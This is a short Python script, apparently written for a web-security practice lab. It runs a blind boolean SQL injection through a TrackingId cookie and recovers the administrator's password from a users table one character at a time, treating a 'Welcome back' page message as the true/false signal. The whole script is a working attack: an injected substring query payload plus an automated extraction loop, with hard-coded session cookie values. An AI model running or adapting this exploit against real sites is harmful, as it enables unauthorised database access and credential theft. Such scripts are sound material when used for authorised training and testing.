import requests 
import re 

caracteres='1234567890abcdefghijklmnopqrstuvwxyz' 

link = 'https://{url}/' 
headers = { 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
    "Referer": link
} 

regex = r'Welcome back' 

cookies = { 
    "TrackingId": "z6dTBHg5EMsHNevC",
    # "session": "VnLMaz1OxsIu2ejrmXojBRrMtE3FdHtJ" 
} 

response = requests.get(link, headers=headers, cookies=cookies) 
print(response.status_code) 
 
senha = ''
count = 0
while True:
    count += 1
    for char in caracteres: 
        print(f'--> "{char}"')
        cookies = { 
            "TrackingId": f"z6dTBHg5EMsHNevC' and substring((select password from users where username='administrator'),1,{count})='{senha}{char}'--", 
            "session": "vqyRVfBiB9iJkuVYMBey4Q6ceHreLU72" 
        } 

        response = requests.get(link, headers=headers, cookies=cookies) 
        texto_html_bruto = response.text 

        resultados = re.findall(regex, texto_html_bruto) 
        if resultados:
            print(f'#### {char} - {resultados}') 
            senha += char
            print(f'# - {senha}\n\n')
            break
    if len(senha) != count:
        break

    # print(resultados) 
print(f'>>> {senha}')
